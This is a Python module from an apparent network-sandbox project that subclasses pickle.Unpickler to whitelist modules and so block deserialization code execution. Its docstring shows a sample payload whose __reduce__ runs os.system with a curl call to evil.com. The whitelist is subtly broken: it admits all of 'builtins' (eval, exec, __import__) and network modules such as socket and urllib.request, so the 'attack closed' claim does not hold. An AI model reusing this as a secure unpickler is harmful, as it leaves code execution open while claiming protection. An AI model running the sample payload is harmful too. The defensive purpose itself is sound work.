"""
mitigations/safe_pickle.py — Restrict what the parent will unpickle.

Attack closed: pickle deserialization RCE.
  The child pickles its return value and sends it through a pipe.  The parent
  calls pickle.loads() on that data.  Any object whose __reduce__ method
  returns an arbitrary callable can execute code in the UNRESTRICTED parent:

      class Evil:
          def __reduce__(self):
              return (os.system, ("curl http://evil.com",))

      @nonet
      def pwn():
          return Evil()     # parent runs os.system when unpickling

  RestrictedUnpickler whitelists only known-safe modules.  Anything else
  raises pickle.UnpicklingError before the class is instantiated.

Hook used: on_parent_result (replaces pickle.loads in the parent).

Extending the whitelist
───────────────────────
If your function legitimately returns objects from a module not listed in
SAFE_MODULES, add the module name to the set:

    from mitigations.safe_pickle import SafePickle
    SafePickle.SAFE_MODULES.add("numpy")   # before the decorator is applied
"""

from __future__ import annotations

import builtins
import io
import pickle
from typing import Any

from mitigations import Mitigation


class RestrictedUnpickler(pickle.Unpickler):
    """A pickle.Unpickler that raises on any class outside SAFE_MODULES."""

    #: Modules whose classes are trusted for deserialization.
    #: Users can extend this set before constructing a SafePickle instance.
    SAFE_MODULES: set[str] = {
        # Python built-ins (int, str, list, dict, Exception subclasses …)
        "builtins",
        "_builtins",
        # Common stdlib types that appear in return values / exceptions
        "collections",
        "collections.abc",
        "datetime",
        "decimal",
        "fractions",
        "pathlib",
        "enum",
        # Standard exception modules — note: "os" is intentionally excluded.
        # Allowing the os module would let a crafted pickle call os.system(),
        # os.popen(), etc. and bypass the network sandbox entirely.
        "urllib.error",
        "urllib.request",
        "http.client",
        "socket",
        "ssl",
        "io",
        "concurrent.futures",
        "queue",
    }

    def find_class(self, module: str, name: str) -> Any:
        if module not in self.SAFE_MODULES:
            raise pickle.UnpicklingError(
                f"[nonet/SafePickle] blocked: {module}.{name} "
                f"is not in the trusted module whitelist"
            )
        # Delegate to the real find_class for the whitelisted module.
        return super().find_class(module, name)


class SafePickle(Mitigation):
    name = "safe_pickle"

    # Expose the whitelist so callers can add modules without subclassing.
    SAFE_MODULES: set[str] = RestrictedUnpickler.SAFE_MODULES

    def on_parent_result(self, raw: bytes) -> tuple[str, Any] | None:
        return RestrictedUnpickler(io.BytesIO(raw)).load()
